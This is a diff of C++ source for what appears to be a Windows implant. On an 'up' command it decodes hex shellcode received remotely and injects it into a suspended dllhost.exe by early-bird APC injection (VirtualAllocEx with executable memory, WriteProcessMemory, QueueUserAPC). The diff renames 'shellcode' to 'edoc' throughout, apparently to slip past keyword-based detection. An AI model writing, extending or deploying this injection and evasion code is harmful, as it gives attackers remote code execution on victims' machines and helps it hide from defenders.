@@ -15,9 +15,9 @@
 
 using namespace std;
 
-DWORD WINAPI shellcode_run(LPVOID lpParameter);
+DWORD WINAPI edoc_run(LPVOID lpParameter);
 string convert_ASCII(string hex);
-string hexshellcode;
+string hexedoc;
 
 
 struct Param
@@ -130,11 +130,11 @@ public:
         }
         else if (this->type == "up\r" || this->type == "up")
         {
-            //shellcode_run(this->value);
+            //edoc_run(this->value);
             try {
 
-                hexshellcode = this->value;
-                HANDLE hThread = CreateThread(NULL, NULL, shellcode_run, NULL, NULL, NULL);
+                hexedoc = this->value;
+                HANDLE hThread = CreateThread(NULL, NULL, edoc_run, NULL, NULL, NULL);
             }
             catch(exception e)
             {
@@ -167,25 +167,25 @@ string convert_ASCII(string hex) {
     return ascii;
 };
 
-DWORD WINAPI shellcode_run(LPVOID lpParameter)
+DWORD WINAPI edoc_run(LPVOID lpParameter)
 {
-    string hexstring = hexshellcode;
-    hexshellcode = "";
-    string shellcode_str = convert_ASCII(hexstring);
+    DWORD ld;
+    string hexstring = hexedoc;
+    hexedoc = "";
+    string edoc_str = convert_ASCII(hexstring);
     int len = hexstring.length();
-    unsigned char shellcode[3000] = { 0 };
-    memcpy(shellcode, shellcode_str.c_str(), len / 2 + 1);
-    UINT shellcodeSize = sizeof(shellcode);
+    unsigned char edoc[3000] = { 0 };
+    memcpy(edoc, edoc_str.c_str(), len / 2 + 1);
+    UINT edocSize = sizeof(edoc);
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
-    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, edocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
-    DWORD ld;
-    //VirtualProtect(shellAddress, shellcodeSize, PAGE_EXECUTE, &ld);
+    WriteProcessMemory(victimProcess, shellAddress, edoc, edocSize, NULL);
+    //VirtualProtect(shellAddress, edocSize, PAGE_EXECUTE, &ld);
 
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
     ResumeThread(threadHandle);
